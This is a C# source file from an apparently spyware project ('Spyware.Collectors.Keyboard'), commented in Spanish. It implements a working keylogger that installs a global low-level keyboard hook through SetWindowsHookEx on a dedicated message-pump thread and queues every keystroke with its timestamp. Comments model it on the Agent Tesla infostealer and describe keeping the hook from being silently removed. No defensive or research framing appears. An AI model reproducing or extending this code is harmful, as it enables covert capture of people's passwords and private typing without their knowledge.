using System.Runtime.InteropServices;

namespace Spyware.Collectors.Keyboard;

/// <summary>Pulsación cruda tal y la entrega el hook, con su marca de tiempo real.</summary>
public readonly record struct RawKey(int VirtualKey, uint ScanCode, uint Flags, DateTime TimestampUtc);

/// <summary>Techo de la cola del hook: evita crecer sin límite si el servicio se atrasa.</summary>
public static class KeyboardLimit
{
    public const int MaxQueuedKeys = 8192;
}

/// <summary>
/// WH_KEYBOARD_LL, el hook de teclado que usa Agent Tesla. Necesita un hilo propio con
/// bucle de mensajes: la documentación del hook bajo nivel exige que el hilo que lo
/// instala tenga clase de registro, bucle de mensajes y esté esperando en
/// <c>GetMessage</c> — con sondeos de <c>PeekMessage</c> el sistema no entrega las
/// pulsaciones. Dentro del callback solo se copia la estructura y se encola; el trabajo
/// pesado (obtener el glifo, SQLite, disco) se hace fuera para no rozar
/// <c>LowLevelHooksTimeout</c>, el plazo tras el cual Windows quita el hook en silencio.
/// </summary>
public sealed class KeylogHook : IDisposable
{
    private const int WmKeyDown = 0x0100;
    private const int WmSysKeyDown = 0x0104;
    private const int WmQuit = 0x0012;

    // Margen para saber si el alta terminó: en una máquina cargada el hilo puede tardar
    // en arrancar, y el servicio necesita un estado real, no supuesto.
    private const int InstallWaitMilliseconds = 5_000;

    private readonly System.Collections.Concurrent.ConcurrentQueue<RawKey> _queue = new();

    // El delegate tiene que seguir vivo mientras el hook esté instalado: por eso es campo.
    private readonly NativeMethods.HookProc _procedure;
    private readonly object _gate = new();
    private readonly ManualResetEventSlim _installed = new(false);

    private IntPtr _hook = IntPtr.Zero;
    private Thread? _worker;
    private volatile bool _running;
    private uint _nativeThreadId;

    public bool IsInstalled => _hook != IntPtr.Zero;

    /// <summary>El hilo de la bomba aún no ha informado del resultado del alta.</summary>
    public bool PendingInstall => _running && !_installed.IsSet;

    public string? InstallFailure { get; private set; }
    public int CallbackCount { get; private set; }
    public int ReceivedCount { get; private set; }
    public int DroppedCount { get; private set; }

    public KeylogHook() => _procedure = OnKeyEvent;

    public void Start()
    {
        lock (_gate)
        {
            if (_running) return;

            _running = true;
            _installed.Reset();
            InstallFailure = null;

            _worker = new Thread(RunPump)
            {
                IsBackground = true,
                Name = "Spyware.KeyboardHook"
            };

            _worker.Start();

            // Esperar al resultado del alta: el servicio tiene que poder decir si el hook
            // quedó instalado o no (en una sesión sin escritorio falla).
            WaitForInstallResult();
        }
    }

    /// <summary>Espera a que el hilo de la bomba informe del alta, sin bloquear sin límite.</summary>
    private void WaitForInstallResult()
    {
        DateTime deadline = DateTime.UtcNow.AddMilliseconds(InstallWaitMilliseconds);

        while (!_installed.IsSet && DateTime.UtcNow < deadline)
            _installed.Wait(TimeSpan.FromMilliseconds(50));
    }

    public void Stop()
    {
        Thread? worker;
        uint threadId;

        lock (_gate)
        {
            if (!_running) return;

            _running = false;
            worker = _worker;
            threadId = _nativeThreadId;
            _worker = null;
        }

        // Con el hilo bloqueado en GetMessage, la única forma ordenada de despertarlo es
        // WM_QUIT por PostThreadMessage; si no llega, el propio bucle ve _running = false.
        if (threadId != 0)
            PostThreadMessage(threadId, WmQuit, IntPtr.Zero, IntPtr.Zero);

        worker?.Join(TimeSpan.FromSeconds(3));
    }

    public bool TryDequeue(out RawKey key) => _queue.TryDequeue(out key);

    /// <summary>
    /// Encola una pulsación respetando el tope de la cola. Lo usa el callback del hook y
    /// también las pruebas/reproductores, que no dependen de que haya un teclado real.
    /// </summary>
    public void Enqueue(RawKey key)
    {
        if (_queue.Count >= KeyboardLimit.MaxQueuedKeys)
            DroppedCount++;
        else
            _queue.Enqueue(key);
    }

    /// <summary>El servicio registra el desbordamiento una sola vez por ciclo.</summary>
    public void ResetDropped() => DroppedCount = 0;

    /// <summary>
    /// Diagnóstico del hook: si el alta falló, si sigue en curso, o cuántas veces llamó el
    /// sistema al procedimiento (0 = el bucle de mensajes no está recibiendo pulsaciones).
    /// </summary>
    public string Describe()
    {
        if (InstallFailure is not null)
            return "sin instalar: " + InstallFailure;

        if (IsInstalled)
            return $"instalado · procedimiento llamado {CallbackCount} veces · en cola {ReceivedCount} · descartadas {DroppedCount}";

        if (PendingInstall)
            return "instalación en curso (el hilo de la bomba no ha informado)";

        return "desinstalado";
    }

    public void Dispose()
    {
        Stop();

        while (_queue.TryDequeue(out _))
        {
            // Se suelta la cola pendiente al apagar el agente.
        }
    }

    private void RunPump()
    {
        _nativeThreadId = GetCurrentThreadId();

        Install();
        _installed.Set();

        try
        {
            // GetMessage bloquea el hilo hasta que hay mensaje: así es como el sistema
            // entrega las pulsaciones del hook bajo nivel.
            while (_running && GetMessage(out NativeMessage message, IntPtr.Zero, 0, 0) > 0)
            {
                if (message.Message == WmQuit)
                    break;

                DispatchMessage(ref message);
            }
        }
        finally
        {
            _running = false;
            Remove();
        }
    }

    private void Install()
    {
        IntPtr module = NativeMethods.GetModuleHandle(null);
        _hook = NativeMethods.SetWindowsHookEx(NativeMethods.WhKeyboardLl, _procedure, module, 0);

        if (_hook == IntPtr.Zero)
        {
            InstallFailure = "SetWindowsHookEx falló (GetLastWin32Error=" + Marshal.GetLastWin32Error() + ")";
            return;
        }

        InstallFailure = null;
    }

    private void Remove()
    {
        if (_hook == IntPtr.Zero) return;

        NativeMethods.UnhookWindowsHookEx(_hook);
        _hook = IntPtr.Zero;
    }

    /// <summary>Callback del hook: corre en el hilo de la bomba y debe volver cuanto antes.</summary>
    private IntPtr OnKeyEvent(int code, IntPtr wParam, IntPtr lParam)
    {
        try
        {
            CallbackCount++;

            if (code >= 0 && IsKeyDown(wParam))
            {
                NativeMethods.Kbdllhookstruct data =
                    Marshal.PtrToStructure<NativeMethods.Kbdllhookstruct>(lParam);

                ReceivedCount++;
                Enqueue(new RawKey(data.VirtualKey, data.ScanCode, data.Flags, DateTime.UtcNow));
            }
        }
        catch
        {
            // Una excepción que salga del hook tumba el proceso: aquí nunca se propaga.
        }

        return NativeMethods.CallNextHookEx(_hook, code, wParam, lParam);
    }

    private static bool IsKeyDown(IntPtr wParam)
    {
        long id = wParam.ToInt64();
        return id is WmKeyDown or WmSysKeyDown;
    }

    // ---------- bomba de mensajes ----------

    [StructLayout(LayoutKind.Sequential)]
    private struct NativeMessage
    {
        public IntPtr WindowHandle;
        public uint Message;
        public IntPtr WParam;
        public IntPtr LParam;
        public uint Time;
        public int PointX;
        public int PointY;
    }

    /// <summary>
    /// <c>GetMessageW</c> devuelve 0 con WM_QUIT y -1 si hay error. Se comprueba el
    /// signo: un error de mensajería no debe dejar el hook colgado sin bucle que lo atienda.
    /// </summary>
    [DllImport("user32.dll", EntryPoint = "GetMessageW")]
    private static extern int GetMessage(out NativeMessage lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

    [DllImport("user32.dll")]
    private static extern IntPtr DispatchMessage(ref NativeMessage lpMsg);

    [DllImport("user32.dll", EntryPoint = "PostThreadMessageW")]
    private static extern bool PostThreadMessage(uint idThread, uint msg, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern uint GetCurrentThreadId();
}
